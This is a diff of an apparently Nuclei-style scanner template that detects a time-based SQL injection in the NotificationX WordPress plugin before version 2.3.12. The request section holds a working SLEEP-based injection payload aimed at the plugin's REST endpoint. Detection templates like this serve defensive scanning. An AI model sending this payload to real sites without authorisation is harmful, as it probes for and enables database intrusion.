@@ -1,5 +1,4 @@
 id: notificationx-sqli
-
 info:
   name: NotificationX < 2.3.12 - SQL Injection
   author: theamanrawat
@@ -10,13 +9,30 @@ info:
   reference:
     - https://wpscan.com/vulnerability/d1480717-726d-4be2-95cb-1007a3f010bb
     - https://wordpress.org/plugins/notificationx/
+  classification:
+    cwe-id:
+      - CWE-89
   metadata:
-    verified: true
     max-request: 2
-  tags: time-based-sqli,wpscan,sqli,wp,wp-plugin,wordpress,notificationx-sql-injection,vuln
-
+    verified: true
+  tags: notificationx-sql-injection,sqli,time-based-sqli,vuln,wordpress,wp,wp-plugin,wpscan
 http:
-  - raw:
+  - extractors:
+      - group: 1
+        internal: true
+        name: apikey
+        regex:
+          - '"home":"(.*?)",'
+        type: regex
+    matchers:
+      - condition: and
+        dsl:
+          - duration>=6
+          - status_code == 401
+          - contains(content_type, "application/json")
+          - contains(body, "There is no notification created with this id")
+        type: dsl
+    raw:
       - |
         GET /wp-json/ HTTP/1.1
         Host: {{Hostname}}
@@ -24,21 +40,3 @@ http:
         @timeout: 10s
         GET /wp-json/notificationx/v1/notification/1?api_key={{md5('{{apikey}}')}}&id[1]=%3d(SELECT/**/1/**/WHERE/**/SLEEP(6)) HTTP/1.1
         Host: {{Hostname}}
-
-    matchers:
-      - type: dsl
-        dsl:
-          - 'duration>=6'
-          - 'status_code == 401'
-          - 'contains(content_type, "application/json")'
-          - 'contains(body, "There is no notification created with this id")'
-        condition: and
-
-    extractors:
-      - type: regex
-        name: apikey
-        group: 1
-        regex:
-          - '"home":"(.*?)",'
-        internal: true
-
